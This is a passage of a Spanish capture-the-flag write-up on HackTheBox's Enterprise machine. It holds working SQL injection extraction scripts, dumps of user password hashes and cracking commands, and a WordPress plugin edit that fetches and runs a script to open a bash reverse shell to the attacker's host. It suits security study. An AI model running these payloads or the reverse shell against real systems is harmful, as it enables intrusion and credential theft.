+<p>Nos responde, pero si hacemos la consulta con un numero, obtenemos:</p>
+
+<pre><code class="language-bash">❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1
+&lt;br /&gt;
+&lt;b&gt;Catchable fatal error&lt;/b&gt;:  
+Object of class mysqli_result could not be converted to string in &lt;b&gt;/var/www/html/wp-content/plugins/lcars/lcars_db.php&lt;/b&gt; on line &lt;b&gt;16&lt;/b&gt;
+&lt;br /&gt;
+</code></pre>
+
+<p>Nos indica que el resultado no puede ser convertido a una cadena de caracteres.</p>
+
+<p>Jmm, ¿será que nos podemos aprovechar de esto? Pues sí, podemos indicarle, si hay algún problema con la consulta hacia el <strong>ID</strong> <code>1</code>, entonces hazme otra cosa, como por ejemplo demorar la respuesta X tiempo con la consulta <code>SLEEP(&lt;tiempo&gt;)</code>, la también llamada <strong>SQL injection - Time based</strong>. Entonces la petición quedaría asi:</p>
+
+<pre><code class="language-html">http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 or sleep(2);#
+</code></pre>
+
+<ul>
+  <li>Con <code>;#</code> le indicamos que todo lo que vaya después lo tome como comentarios.</li>
+</ul>
+
+<p>Si lo extrapolamos a como viajaría la consulta hacia la base de datos, quedaría asi:</p>
+
+<pre><code class="language-sql">SELECT ID FROM wp_posts WHERE post_name = 1 or sleep(2);#;
+</code></pre>
+
+<ul>
+  <li>Como el nombre del post da error, ejecuta el <strong>sleep</strong>.</li>
+</ul>
+
+<p>Si ejecutamos en <code>bash</code>, tenemos:</p>
+
+<pre><code class="language-bash"># URL encodeada
+❭ time curl -s "http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1%20or%20sleep(2);#"
+&lt;br /&gt;
+&lt;b&gt;Catchable fatal error&lt;/b&gt;:  Object of class mysqli_result could not be converted to string in &lt;b&gt;/var/www/html/wp-content/plugins/lcars/lcars_db.php&lt;/b&gt; on line &lt;b&gt;16&lt;/b&gt;&lt;br /&gt;
+
+real    1m25,973s
+...
+</code></pre>
+
+<p>Se demora 1 minuto con 25 segundos (que es un montón, pero es porque por cada fila de la tabla hace el <strong>sleep</strong>), incluso al indicarle que simplemente se demorara <strong>2</strong> segundos más… Por lo tanto podemos jugar con el mismo <strong>SLEEP</strong> para indicarle milisegundos, a ver cuanto se demora en realidad:</p>
+
+<pre><code class="language-bash">❭ time curl -s "http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=2%20or%20sleep(0.1);#"
+&lt;br /&gt;
+&lt;b&gt;Catchable fatal error&lt;/b&gt;:  Object of class mysqli_result could not be converted to string in &lt;b&gt;/var/www/html/wp-content/plugins/lcars/lcars_db.php&lt;/b&gt; on line &lt;b&gt;16&lt;/b&gt;&lt;br /&gt;
+
+real    0m4,658s
+...
+</code></pre>
+
+<p>Validamos de nuevo y asi nos aseguramos:</p>
+
+<pre><code class="language-bash">❭ time curl -s "http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=2%20or%20sleep(0.1);#"
+&lt;br /&gt;
+&lt;b&gt;Catchable fatal error&lt;/b&gt;:  Object of class mysqli_result could not be converted to string in &lt;b&gt;/var/www/html/wp-content/plugins/lcars/lcars_db.php&lt;/b&gt; on line &lt;b&gt;16&lt;/b&gt;&lt;br /&gt;
+
+real    0m4,657s
+...
+</code></pre>
+
+<p>Bien, entonces con esto validamos una explotación SQL basada en tiempo y tenemos una base para probar después, <strong>4 segundos con SLEEP(0.1)</strong>. Creemos un script para jugar con las tablas y extraer info interesante:</p>
+
+<h3 id="explotacion-sqli">Explotacion SQL injection manual <a href="#explotacion-sqli">#</a></h3>
+
+<blockquote>
+  <p>Lindo recurso - <a href="pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">MySQL SQL Injection Cheat Sheet</a>.</p>
+</blockquote>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import requests
+import string
+import signal
+import time
+from pwn import *
+
+# Ctrl + C
+def def_handler(sig, frame):
+    print("\nInterrupción, saliendo...\n")
+    exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+url = "http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php"
+result = ""
+
+# abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~£
+set_chars = string.ascii_letters + string.digits + string.punctuation + "£"
+
+session = requests.Session()
+
+# Hacemos de cuenta que hay 10 bases de datos
+p1 = log.progress("Extrayendo bases de datos")
+for db_position in range(0,10):
+    p2 = log.progress("DB [%d]" % (db_position))
+    # Recorremos cada base de datos y vamos descubriendo las letras que componen su nombre
+    for word_position in range(1,51):
+        # Iteramos entre cada letra del conjunto
+        for letter in set_chars:
+            # Tiempo antes de la petición
+            time_before = time.time()
+            payload = "IF(Ascii(substring((SELECT schema_name FROM information_schema.schemata LIMIT %d,1),%d,1))=%d,sleep(0.1),0)" % (db_position, word_position, ord(letter))
+            p1.status(payload)
+
+            data_get = {"query" : "1 or " + payload}
+            r = session.get(url, params=data_get)
+
+            # Tiempo despues de la petición
+            time_after = time.time()
+            # Si la diferencia de tiempos es mayor a 3 (recuerden que 0.1 era igual a 4 segundos) sabemos que ejecuto el SLEEP,
+            # por lo tanto sabemos que esa letra hace parte de la respuesta
+            if time_after - time_before &gt; 3:
+                result += letter
+                p2.status(result)
+                break
+            # Si llega a este caracter, quiere decir que ya termino la palabra actual y va a la siguiente.
+            elif letter == "£":
+                break
+
+        if letter == "£":
+            break
+
+    p2.success(result)
+    result = ""
+
+p1.success("d0Ne")
+print("\nk3Ep br3ak1n6 4anYyyu...\n")
+</code></pre>
+
+<p>En la ejecución tenemos:</p>
+
+<pre><code class="language-bash">❭ python3 ex_db_name.py 
+[+] Extrayendo bases de datos: d0Ne
+[+] DB [0]: information_schema
+[+] DB [1]: joomla
+[+] DB [2]: joomladb
+[+] DB [3]: mysql
+[+] DB [4]: performance_schema
+[+] DB [5]: sys
+[+] DB [6]: wordpress
+[+] DB [7]: wordpressdb
+[+] DB [8]
+[+] DB [9]
+
+k3Ep br3ak1n6 4anYyyu...
+</code></pre>
+
+<p>Opa, tenemos 8 bases de datos 😬</p>
+
+<p>Veamos primero las relacionadas con <strong>WordPress</strong></p>
+
+<h4 id="sql-injection---columnas-wordpress-db">SQL injection - Columnas WordPress DB</h4>
+
+<p>Acá estuve bastante rato atascado intentando cosas, ya que los payloads que había usado de explotaciones pasadas no me estaban funcionando, ni siquiera el payload “obvio” que debería ir después de encontrar las bases de datos:</p>
+
+<pre><code class="language-py"># Esta deberia ser la siguiente en explotar:
+
+payload = "1 or IF(Ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='wordpress' LIMIT %d,1),%d,1))=%d,sleep(0.1),0);-- -" % (table_position, word_position, ord(letter))
+
+# O de esta forma (que si la usamos para descubrir las bases de datos funciona):
+
+payload = "1 or (SELECT (CASE WHEN (ORD(MID((SELECT DISTINCT(IFNULL(CAST(table_name AS NCHAR),0x20)) "
+payload += "FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='wordpress' LIMIT %d,1),%d,1))=%d) " % (table_position, word_position, ord(letter))
+payload += "THEN 1 ELSE (SELECT 2 UNION SELECT 3) END))"
+</code></pre>
+
+<p>Pero nada, siempre obteníamos una respuesta en blanco :(</p>
+
+<p>Tuve que decantarme por ver como hacia <strong>sqlmap</strong> las peticiones y desde ahí usar la sentencia para jugar, al ejecutar la instrucción (de abajo) podemos ver la siguiente sentencia SQL que hace para extraer nombres de tablas:</p>
+
+<pre><code class="language-bash">❭ sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 -D wordpress --tables -v6
+</code></pre>
+
+<ul>
+  <li>Le indicamos la URL vulnerable,</li>
+  <li>que tome la base de datos llamada <strong>WordPress</strong>,</li>
+  <li>nos dumpee las tablas y</li>
+  <li>que el verbose sea máximo, asi tenemos claridad de los payloads y cositas que usa.</li>
+</ul>
+
+<p>Encontramos esta sentencia:</p>
+
+<p>(Le cambio algunas cositas para que sea más intuitiva)</p>
+
+<pre><code class="language-sql">(
+   SELECT 8350 FROM(
+       SELECT COUNT(*),CONCAT(
+           0x41,(
+               SELECT MID(
+                   (
+                       IFNULL(
+                           CAST(
+                               table_name AS NCHAR
+                           ),0x20
+                       )
+                   ),1,50
+               ) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x4242) LIMIT 0,1
+           ),0x43,FLOOR(RAND(0)*2)
+       )x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x
+   )z
+)
+</code></pre>
+
+<p>Hace un substring (<a href="https://www.w3resource.com/mysql/string-functions/mysql-mid-function.php">MID</a>) del nombre de la tabla (50 posiciones por si algo) encontrada (<a href="https://www.mysqltutorial.org/sql-in.aspx">IN</a>) en la base de datos <strong>BB</strong> (<code>0x4242</code> en hexadecimal), esa tabla la concatena (<a href="https://www.w3schools.com/mysql/func_mysql_concat.asp">CONCAT</a>) con 3 valores más: <strong>A</strong> (<code>0x41</code> hex), <strong>C</strong> (<code>0x41</code> hex) y un número random (<a href="https://database.guide/mysql-rand-function-generate-a-random-number-in-mysql/">RAND</a>) jugando con el entero más grande (<a href="https://www.w3resource.com/mysql/mathematical-functions/mysql-floor-function.php">FLOOR</a>). El resultado (la tabla, por ejemplo: <strong>Aclaroquesi_tableC</strong>) viene concatenada en varios valores, esto para generar algunos errores y agruparlos (:</p>
+
+<p>Es medio rara de entender, pero cada vez que la lees se vuelve más fácil. Listo, pues apoyémonos de esta sentencia para extraer las tablas de las bases de datos anteriores:</p>
+
+<h4 id="sql-injection---tablas">SQL injection - Tablas</h4>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import requests
+import string
+import signal
+import time
+import sys
+import re
+from pwn import *
+
+# Ctrl + C
+def def_handler(sig, frame):
+    print("\nInterrupción, saliendo...\n")
+    exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+if len(sys.argv) != 2:                     
+    print("\n[!] Usage: python3 " + sys.argv[0] + " &lt;database&gt;\n")
+    exit(0)
+
+url = "http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php"
+result = ""
+
+# Recibimos como argumento la base de datos y la convertimos a hexadecimal
+session = requests.Session()
+db_name = sys.argv[1]
+db_name_hex = db_name.encode('utf-8').hex()
+
+p1 = log.progress("Extrayendo tablas de la base de datos %s" % (db_name))
+p2 = log.progress("Payload")
+
+# En el caso de que existan 100 tablas
+for table_position in range(0,100):
+
+    # 0x5441424C45 = TABLE
+    # 0x%s = El nombre de la base de datos en hexadecimal
+    ## Resultado: i.e -&gt; TABLEestaeslatablaTABLE
+    payload = "(SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x5441424C45,(SELECT MID((IFNULL(CAST(table_name AS NCHAR),0x20)),1,50) FROM "
+    payload += "INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x%s) LIMIT %d,1),0x5441424C45,FLOOR(RAND(0)*2))x " % (db_name_hex, table_position)
+    payload += "FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)nada)"
+
+    data_get = {"query" : "1 or " + payload}
+    p2.status(data_get["query"])
+    r = session.get(url, params=data_get)
+
+    if "Duplicate" not in r.text:
+        break
+
+    p3 = log.progress("Tabla [%d]" % (table_position))
+
+    # Tomamos el resultado y extraermos lo que este entre la E (e final de TABLE) y la T (t inicial de TABLE), esa seria la tabla.
+    result += re.findall(r'E(.*?)T', r.text)[0]
+    p3.success(result)
+    result = ""
+
+p1.success("d0Ne")
+p2.success("d0Ne")
+print("\nk3Ep br3ak1n6 4anYyyu...\n")
+</code></pre>
+
+<p>Ahora si, probemos con la base de datos <strong>wordpress</strong>:</p>
+
+<pre><code class="language-bash">❭ python3 ex_tables.py wordpress
+[+] Extrayendo tablas de la base de datos wordpress: d0Ne
+[+] Payload: d0Ne
+[+] Tabla [0]: wp_commentmeta
+[+] Tabla [1]: wp_comments
+[+] Tabla [2]: wp_links
+[+] Tabla [3]: wp_options
+[+] Tabla [4]: wp_postmeta
+[+] Tabla [5]: wp_posts
+[+] Tabla [6]: wp_term_relationships
+[+] Tabla [7]: wp_term_taxonomy
+[+] Tabla [8]: wp_termmeta
+[+] Tabla [9]: wp_terms
+[+] Tabla [10]: wp_usermeta
+[+] Tabla [11]: wp_users
+
+k3Ep br3ak1n6 4anYyyu...
+
+</code></pre>
+
+<p>Bien, 12 tablas, juguemos con el script para extraer columnas de las tablas:</p>
+
+<h4 id="sql-injection---columnas-wordpress-db-1">SQL injection - Columnas wordpress DB</h4>
+
+<pre><code class="language-py">...
+table_name = sys.argv[2]
+table_name_hex = table_name.encode('utf-8').hex()
+...
+    payload = "(SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x5441424C45,(SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.COLUMNS "
+    payload += "WHERE table_schema IN (0x%s) AND table_name IN (0x%s) LIMIT %d,1),0x5441424C45,FLOOR(RAND(0)*2))x " % (db_name_hex, table_name_hex, table_position)
+    payload += "FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)nada)"
+...
+</code></pre>
+
+<p>Le indicamos que ahora tome en otro parametro la tabla a fuzzear, ejecutandolo contra la tabla <code>wp_users</code>, tenemos:</p>
+
+<pre><code class="language-bash">❭ python3 ex_colums.py wordpress wp_users
+[+] Extrayendo columnas de la tabla wp_users: d0Ne
+[+] Payload: d0Ne
+------------------------------------------·
+[+] Columna [0]: ID
+[+] Columna [1]: user_login
+[+] Columna [2]: user_pass
+[+] Columna [3]: user_nicename
+[+] Columna [4]: user_email
+[+] Columna [5]: user_url
+[+] Columna [6]: user_registered
+[+] Columna [7]: user_activation_key
+[+] Columna [8]: user_status
+[+] Columna [9]: display_name
+
+k3Ep br3ak1n6 4anYyyu...
+
+</code></pre>
+
+<h4 id="sql-injection---info-columnas">SQL injection - Info columnas</h4>
+
+<p>Perfecto, veamos la data que hay en la columna <code>user_login</code> y <code>user_pass</code>:</p>
+
+<pre><code class="language-py">...
+db_name = sys.argv[1]
+table_name = sys.argv[2]
+column_name = sys.argv[3]
+...
+    # Debemos agrandar el substring, ya que pueda que nos encontremos unos hashes y pueden ser largos, ahora la extraccion es: Edata_de_la_tablaT
+    payload = "(SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x45,(SELECT MID((IFNULL(CAST(%s AS NCHAR),0x20)),1,80) FROM %s.%s " % (column_name, db_name, table_name)
+    payload += "LIMIT %d,1),0x54,FLOOR(RAND(0)*2))x " % (table_position)
+    payload += "FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)nada)"
+...
+</code></pre>
+
+<pre><code class="language-bash">❭ python3 ex_information.py wp_users user_login
+[+] Info columna user_login - tabla wp_users: d0Ne
+[+] Payload: d0Ne
+------------------------------------------·
+[+] [0]: william.riker
+
+k3Ep br3ak1n6 4anYyyu...
+
+</code></pre>
+
+<pre><code class="language-bash">❭ python3 ex_information.py wp_users user_pass
+[+] Info columna user_pass - tabla wp_users: d0Ne
+[+] Payload: d0Ne
+------------------------------------------·
+[+] [0]: $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.
+
+k3Ep br3ak1n6 4anYyyu...
+
+</code></pre>
+
+<p>Solo hay un registro, el usuario <code>william.riker</code> (que habíamos descubierto antes) y la contraseña encriptada <code>$P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.</code>…</p>
+
+<p>Perfecto, pues antes de seguir con las demás bases de datos, intentemos crackear ese hash, lo guardamos en un archivo y ejecutamos <strong>john</strong> o <strong>hashcat</strong>:</p>
+
+<ul>
+  <li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Example hashes - Wiki Hashcat</a>.</li>
+</ul>
+
+<pre><code class="language-bash">❭ john --wordlist=/usr/share/wordlists/rockyou.txt william_hash 
+</code></pre>
+
+<p>Pero se queda un bueeeeeen rato intentando crackear el hash, hasta llegar al final del archivo e indicarnos que no ha sido crackeado :( Entonces sigamos profundizando entre las otras bases de datos.</p>
+
+<p>…</p>
+
+<p><strong>Creamos un script (completo y con varios cambios) que contenga todas las extracciones, asi es muuuucho más fácil de movernos entre bases de datos, tablas y columnas ;P</strong></p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/ex_all.py">ex_all.py</a></p>
+</blockquote>
+
+<p>…</p>
+
+<p>Veamos la base de datos <strong>joomla</strong>:</p>
+
+<pre><code class="language-bash">❭ python3 ex_all.py joomla
+[+] Extrayendo tablas de la base de datos joomla: d0Ne
+[+] Payload: d0Ne
+------------------------------------------·
+
+</code></pre>
+
+<p>Está vacía, juguemos entonces con la base de datos <strong>joomladb</strong> (que si revisamos nuestro escaneo de <code>nmap</code>, nos indicaba que el puerto <strong>8080</strong> está sirviendo un CMS <strong>Joomla</strong>):</p>
+
+<pre><code class="language-bash">❭ python3 ex_all.py joomladb  
+[+] Extrayendo tablas de la base de datos joomladb: d0Ne
+[+] Payload: d0Ne
+------------------------------------------·  
+[+] Tabla [0]: edz2g_assets                  
+...
+...
+...
+[+] Tabla [69]: edz2g_users
+[+] Tabla [70]: edz2g_utf8_conversion
+[+] Tabla [71]: edz2g_viewlevels
+</code></pre>
+
+<p>Bien, enumeremos la tabla <code>edz2g_users</code>:</p>
+
+<pre><code class="language-bash">❭ python3 ex_all.py joomladb edz2g_users
+[+] Extrayendo columnas de la tabla edz2g_users: d0Ne
+[+] Payload: d0Ne
+------------------------------------------·
+[+] Columna [0]: id
+[+] Columna [1]: name
+[+] Columna [2]: username
+[+] Columna [3]: email
+[+] Columna [4]: password
+[+] Columna [5]: block
+[+] Columna [6]: sendEmail
+[+] Columna [7]: registerDate
+[+] Columna [8]: lastvisitDate
+[+] Columna [9]: activation
+[+] Columna [10]: params
+[+] Columna [11]: lastReset
+[+] Columna [12]: resetCount
+[+] Columna [13]: otpKey
+[+] Columna [14]: otep
+[+] Columna [15]: requireReset
+</code></pre>
+
+<p>Veamos la data de los campos <code>username</code> y <code>password</code>:</p>
+
+<pre><code class="language-bash">❭ python3 ex_all.py joomladb edz2g_users username
+[+] Info columna username - tabla edz2g_users: d0Ne
+[+] Payload: d0Ne
+------------------------------------------·
+[+] [0]: geordi.la.forge
+[+] [1]: Guinan
+
+k3Ep br3ak1n6 4anYyyu...
+
+</code></pre>
+
+<pre><code class="language-bash">❭ python3 ex_all.py joomladb edz2g_users password
+[+] Info columna password - tabla edz2g_users: d0Ne
+[+] Payload: d0Ne
+------------------------------------------·
+[+] [0]: $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy
+[+] [1]: $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q
+
+k3Ep br3ak1n6 4anYyyu...
+
+</code></pre>
+
+<p>Opa 2 usuarios con credenciales:</p>
+
+<pre><code class="language-bash">* geordi.la.forge:$2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy.
+* Guinan:$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q.
+</code></pre>
+
+<p>Bien, pues volvamos a intentar crackear, pero ahora estos hashes:</p>
+
+<pre><code class="language-bash">❭ strings joomla_hashes 
+$2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy
+$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q
+</code></pre>
+
+<p>Para cambiar, usemos <a href="https://resources.infosecinstitute.com/topic/hashcat-tutorial-beginners/">hashcat</a>:</p>
+
+<pre><code class="language-bash">❭ hashcat -m 3200 -a 0 -o cracked.txt joomla_hashes /usr/share/wordlists/rockyou.txt
+...
+</code></pre>
+
+<ul>
+  <li><code>-m</code>: Le indicamos el tipo de hash, <strong>3200</strong> hace referencia a <strong>bcrypt</strong>.</li>
+  <li><code>-a</code>: Con <strong>0</strong>, le decimos que el ataque es tipo diccionario.</li>
+  <li><code>-o</code>: El resultado crackeado nos lo guarda en el archivo <code>craced.txt</code>.</li>
+  <li>Pasamos archivo de hashes.</li>
+  <li>Pasamos diccionario a usar.</li>
+</ul>
+
+<blockquote>
+  <p>Unlike the other hash algorithms we’ve encountered so far bcrypt is specifically designed to be slow to crack, especially for GPUs. <a href="https://unicornsec.com/home/tryhackme-crack-the-hash">Crack The Hash - TryHackMe</a>.</p>
+</blockquote>
+
+<p>Y sí, es demasiado demorado (18 días 😱 +-), dejémoslo un rato y mientras tanto enumeremos el puerto <strong>8080</strong>.</p>
+
+<p>…</p>
+
+<h3 id="puerto-8080">Puerto 8080 <a href="#puerto-8080">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080.png" alt="112page8080" /></p>
+
+<p>Bien, una página web normal, con algunas referencias extrañas, también al final vemos un panel login, pero no podemos hacer mucho con él a pesar de tener usuarios válidos (presuntamente), ya que no tenemos contraseñas aún…</p>
+
+<p>Profundizando (y de nuevo, recordando el escaneo con <strong>nmap</strong>), vemos que está siendo soportada por el gestor de contenido (CMS) <strong>Joomla</strong>, que básicamente es una herramienta para la creación de sitios web.</p>
+
+<blockquote>
+  <p><a href="https://www.webempresa.com/joomla.html">¿Qué es Joomla?</a>.</p>
+</blockquote>
+
+<p>Enumerando también nos damos cuenta de que tiene disponible el recurso <code>robots.txt</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080_robotsTXT.png" alt="112page8080_robotsTXT" /></p>
+
+<p>Bien, varios apartados, veamos <code>administrator/</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080_administratorPANEL.png" alt="112page8080_administratorPANEL" /></p>
+
+<p>Otro panel de logeo, pero igual, jugando no logramos nada :(</p>
+
+<p>A este punto habían pasado varios minutos y nada con respecto al crackeo, asi que cancelándolo y probando otras cositas como estas (e.e) obtenemos:</p>
+
+<ul>
+  <li>Crear un diccionario basado en el contenido de las webs: <code>curl</code> &gt; <code>html2text</code> &gt; <code>hashcat/john</code>. Nada, seguimos sin resultados.</li>
+  <li>Tomar el anterior diccionario, pero ahora agregarle <strong>reglas</strong>, les dejo un post donde las explican. Pero después de jugar seguimos igual :(
+    <ul>
+      <li><a href="https://laconicwolf.com/2018/09/29/hashcat-tutorial-the-basics-of-cracking-passwords-with-hashcat/">Dictionary attack with rules - Hashcat</a>.</li>
+      <li>(Mejor dos recursos, este está buenísimo) <a href="https://notsosecure.com/one-rule-to-rule-them-all/">One Rule to Rule Them All</a>.</li>
+    </ul>
+  </li>
+  <li>Tomar los nombres de los usuarios (como son medio extraños) crear un diccionario que los contenga y volver a jugar con las reglas… Nada :(</li>
+</ul>
+
+<p>Otras cositas que intentamos, pero contra la web fueron:</p>
+
+<ul>
+  <li>Fuzzear entre algunos de los directorios anteriores, pero no encontramos nada interesante.</li>
+  <li>Buscar de alguna forma la versión del <strong>Joomla</strong>, <a href="https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website">acá encontramos</a> que en la ruta <code>administrator/manifests/files/joomla.xml</code> se puede visualizar, y si:</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080_administratorVERSION.png" alt="112page8080_administratorVERSION" /></p>
+
+<p>Buscando las vulnerabilidades relacionadas vemos algunas, pero no obtenemos nada de ellas :(</p>
+
+<p>…</p>
+
+<p>Después de un rato jugando con las bases de datos y sus tablas, encontramos esto en la tabla <code>wp_posts</code> (donde están los posts del sitio):</p>
+
+<pre><code class="language-bash">❭ python3 ex_all.py wordpress
+[+] Extrayendo tablas de la base de datos wordpress: d0Ne
+[+] Payload: d0Ne
+
+...
+[+] Tabla [5]: wp_posts
+...
+</code></pre>
+
+<pre><code class="language-bash">❭ python3 ex_all.py wordpress wp_posts
+[+] Extrayendo columnas de la tabla wp_posts: d0Ne
+[+] Payload: d0Ne
+
+...
+[+] Columna [4]: post_content
+[+] Columna [5]: post_title
+...
+</code></pre>
+
+<pre><code class="language-bash">❭ python3 ex_all.py wordpress wp_posts post_status
+[+] Info columna post_title - tabla wp_posts: d0Ne
+[+] Payload: d0Ne
+
+...
+[+] [34]: Stardate 55132.2
+[+] [35]: Passwords 
+[+] [36]: Passwords
+[+] [37]: Passwords
+[+] [38]: YAYAYAYAY.
+...
+</code></pre>
+
+<p>Vemos 2 posts conocidos, pero 3 con un nombre bastante llamativo y que no vimos en nuestro reconocimiento web… Enfoquémonos en las filas 35, 36 y 37. Echemos un ojo a su contenido:</p>
+
+<pre><code class="language-bash">❭ python3 ex_all.py wordpress wp_posts post_content
+[+] Info columna post_content - tabla wp_posts: d0Ne
+[+] Payload: d0Ne
+
+...
+[+] [35]: Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 ZD3YxfnSjezg67JZ u*Z14ru0p#ttj83zS6 &amp;amp;nbsp; &amp;amp;nbsp;
+[+] [36]: Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 u*Z14ru0p#ttj83zS6 &amp;amp;nbsp; &amp;amp;nbsp;
+[+] [37]: Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 ZD3YxfnSjezg67JZ u*Z14ru0p#ttj83zS6 &amp;amp;nbsp; &amp;amp;nbsp;
+...
+</code></pre>
+
+<p>What jjaja, que loco esto, en el lugar menos pensado vemos lo que parecen ser unas contraseñas (y el post lo dice tambien :P):</p>
+
+<pre><code class="language-bash">* ZxJyhGem4k338S2Y
+* enterprisencc170
+* ZD3YxfnSjezg67JZ
+* u*Z14ru0p#ttj83zS6
+</code></pre>
+
+<p>Jmm, pues viendo quien creo esos posts (columna <code>post_author</code>) obtenemos el ID <strong>1</strong>, si vemos la tabla <code>wp_users</code> y jugamos con el campo <strong>ID</strong> y <strong>user_login</strong>, vemos que el <strong>ID:1</strong> hace referencia a <strong>william.riker</strong>, asi que él fue el que puso esas contraseñas en el post, por lo que probablemente alguna de ellas nos sirva para entrar con su cuenta en el panel login de <strong>WordPress</strong>, validemos:</p>
+
+<p>…</p>
+
+<h4 id="wordpress-login-done">WordPress login done</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin.png" alt="112page80_wpAdmin" /></p>
+
+<p>Probando con <code>william.riker:u*Z14ru0p#ttj83zS6</code> logramos entrar :)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin_dash.png" alt="112page80_wpAdmin_dash" /></p>
+
+<p>Perfectoooo, tamos dentro :’)</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112birDance.gif" style="display: block; margin-left: auto; margin-right: auto; width: 30%;" /></p>
+
+<p>Bastante camino para llegar acá :) Ahora es muy simple es entablarnos una reverse Shell, simplemente debemos modificar algunos de los plugins que existan en el sitio, como ya jugamos con el plugin <strong>lcars</strong>, sabemos que existe.</p>
+
+<p>Vamos a <strong>Plugins</strong> &gt; <strong>Editor</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin_plugins.png" alt="112page80_wpAdmin_plugins" /></p>
+
+<p>Seleccionamos ahora el plugin <strong>lcars</strong> (donde esta la flecha 😜) y damos clic en <strong>Select</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin_plugins_lcars.png" alt="112page80_wpAdmin_plugins_lcars" /></p>
+
+<p>Perfecto, vemos los 3 archivos con los que ya jugamos y su contenido, solo que ahroa tenemos la posibilidad de editarlos, validemos que usuario esta ejecutando el servicio web, usare <code>lcars.php</code>:</p>
+
+<pre><code class="language-php">...
+// need to make it secure
+
+system("whoami");
+
+?&gt;
+</code></pre>
+
+<p>Clic en <strong>Update File</strong>, obtenemos <strong>File edited successfully.</strong> y vamos al archivo en la web:</p>
+
+<pre><code class="language-bash">❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars.php
+www-data
+</code></pre>
+
+<p>Listo, confirmamos ejecucion remota de comandos, ahora creemonos un archivo que contenga lo que queremos que ejecute el sistema, asi se nos hace más facil movernos entre comandos sin tener que modificar el plugin cada vez:</p>
+
+<pre><code class="language-bash">❭ cat rev.sh 
+#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/10.10.14.17/4433 0&gt;&amp;1
+</code></pre>
+
+<p>Levantamos un servidor web con <strong>Python</strong>:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>Y nos ponemos en escucha con <strong>netcat</strong> en el puerto <strong>4433</strong>: <code>nc -lvp 4433</code>.</p>
+
+<p>Finalmente editamos el plugin:</p>
+
+<pre><code class="language-php">...
+// need to make it secure
+
+// Leera el contenido del archivo rev.sh y con "| bash" lo interpretara.
+system("curl http://10.10.14.17:8000/rev.sh | bash");
+
+?&gt;
+</code></pre>
+
+<p>Simplemente hacemos una petición hacia el archivo y obtenemos nuestra reverse Shell:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112bash_wwwdata_RevSH.png" alt="112bash_wwwdata_RevSH" /></p>
+
